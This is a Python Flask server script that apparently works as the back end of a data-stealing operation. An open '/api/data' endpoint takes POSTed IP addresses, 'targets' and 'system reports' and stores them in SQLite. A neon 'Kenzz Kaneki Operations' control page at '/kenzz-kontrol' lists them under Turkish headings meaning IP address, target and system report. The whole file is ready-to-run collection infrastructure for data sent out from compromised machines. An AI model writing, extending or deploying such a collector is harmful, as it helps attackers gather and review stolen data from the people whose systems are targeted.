from flask import Flask, request, jsonify, render_template_string
import sqlite3, os

app = Flask(__name__)
DB_PATH = "/tmp/data.db" 

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, user TEXT, report TEXT, date TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

@app.route('/api/data', methods=['POST'])
def receive_data():
    data = request.json
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("INSERT INTO logs (ip, user, report) VALUES (?, ?, ?)", (data['ip'], data['user'], data['full_report']))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"}), 200

@app.route('/kenzz-kontrol')
def view_data():
    if not os.path.exists(DB_PATH): return "<body style='background:#000;color:#00f2ff;font-family:sans-serif;text-align:center;padding-top:50px;'><h1>Henuz veri yok kanka, gozun yolda olsun...</h1></body>"
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT ip, user, report, date FROM logs ORDER BY id DESC")
    rows = cur.fetchall()
    conn.close()
    
    html = """
    <html><head><title>KENZZ KANEKI V14 - NEON</title>
    <style>
        body { 
            background: #020205; 
            color: #bc13fe; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            padding: 30px;
        }
        h1 { 
            text-align: center; 
            color: #00f2ff; 
            text-transform: uppercase;
            font-size: 3em;
            letter-spacing: 8px;
            /* DOLGULU VE PARLAK YAZI EFEKTİ */
            text-shadow: 0 0 10px #00f2ff, 0 0 20px #00f2ff, 0 0 40px #bc13fe;
            margin-bottom: 40px;
        }
        table { 
            border-collapse: separate; 
            border-spacing: 0 10px;
            width: 100%; 
            background: transparent;
        }
        th { 
            background: #bc13fe; 
            color: #fff; 
            padding: 15px; 
            text-transform: uppercase;
            box-shadow: 0 0 15px #bc13fe;
            border-radius: 5px;
        }
        td { 
            background: rgba(20, 20, 30, 0.8);
            border: 1px solid #00f2ff;
            padding: 15px; 
            color: #fff;
            box-shadow: inset 0 0 10px rgba(0, 242, 255, 0.2);
        }
        tr:hover td {
            border-color: #bc13fe;
            box-shadow: 0 0 20px rgba(188, 19, 254, 0.4);
            transform: scale(1.01);
            transition: 0.3s;
        }
        pre { 
            white-space: pre-wrap; 
            color: #00f2ff; 
            background: #000; 
            padding: 15px; 
            border-left: 4px solid #bc13fe;
            font-size: 14px;
        }
        .date { color: #888; font-style: italic; }
    </style>
    </head>
    <body>
        <h1>Kenzz Kaneki Operations</h1>
        <table>
            <tr><th>IP ADRESİ</th><th>HEDEF</th><th>SİSTEM RAPORU</th><th>ZAMAN</th></tr>
            {% for row in rows %}
            <tr>
                <td style="color:#00f2ff; font-weight:bold; font-size:1.2em;">{{row[0]}}</td>
                <td style="color:#bc13fe; font-weight:bold;">{{row[1]}}</td>
                <td><pre>{{row[2]}}</pre></td>
                <td class="date">{{row[3]}}</td>
            </tr>
            {% endfor %}
        </table>
    </body></html>
    """
    return render_template_string(html, rows=rows)

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000)